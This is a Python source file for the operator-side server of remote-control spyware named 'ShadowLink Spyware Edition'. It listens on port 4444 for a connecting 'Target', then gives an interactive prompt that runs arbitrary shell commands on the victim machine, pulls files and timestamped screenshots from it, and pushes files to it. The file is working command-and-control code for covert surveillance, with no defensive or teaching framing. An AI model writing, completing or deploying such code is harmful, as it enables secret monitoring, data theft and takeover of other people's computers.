import socket
import os
import datetime

SERVER_IP = "0.0.0.0"
PORT = 4444

def receive_file(sock, filename):
    try:
        response = sock.recv(1024).decode()
        if not response.startswith("EXISTS"):
            print(f"[-] Error: {response}")
            return

        filesize = int(response.split()[1])
        sock.send("OK".encode())
        
        print(f"[*] Receiving screenshot/file ({filesize} bytes)...")
        with open(filename, "wb") as f:
            total_recv = 0
            while total_recv < filesize:
                data = sock.recv(4096)
                if not data: break
                f.write(data)
                total_recv += len(data)
        print(f"[+] Saved as: {filename}")
        
    except Exception as e:
        print(f"[-] Transfer Error: {e}")

def send_file(sock, filename):
    if not os.path.exists(filename):
        print("[-] File not found.")
        return
    
    filesize = os.path.getsize(filename)
    sock.send(f"UPLOAD {filename} {filesize}".encode())
    
    response = sock.recv(1024).decode()
    if response != "OK":
        print(f"[-] Client Error: {response}")
        return

    with open(filename, "rb") as f:
        while True:
            chunk = f.read(4096)
            if not chunk: break
            sock.send(chunk)
            
    print(sock.recv(1024).decode())

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((SERVER_IP, PORT))
    s.listen(1)
    print(f"[*] ShadowLink Spyware Edition Listening on {PORT}...")
    
    client, addr = s.accept()
    print(f"[+] Target Connected: {addr[0]}")
    
    while True:
        command = input(f"ShadowLink@{addr[0]}> ")
        
        if not command.strip(): continue
        if command == 'exit': break
        
        if command.startswith("download"):
            client.send(command.encode())
            receive_file(client, command.split()[1])
            
        elif command.startswith("upload"):
            send_file(client, command.split()[1])
            
        elif command == "screenshot":
            client.send("screenshot".encode())
            # Generate timestamped filename
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            receive_file(client, f"screenshot_{ts}.png")
            
        else:
            client.send(command.encode())
            print(client.recv(4096).decode())

    client.close()
    s.close()

if __name__ == "__main__":
    start_server()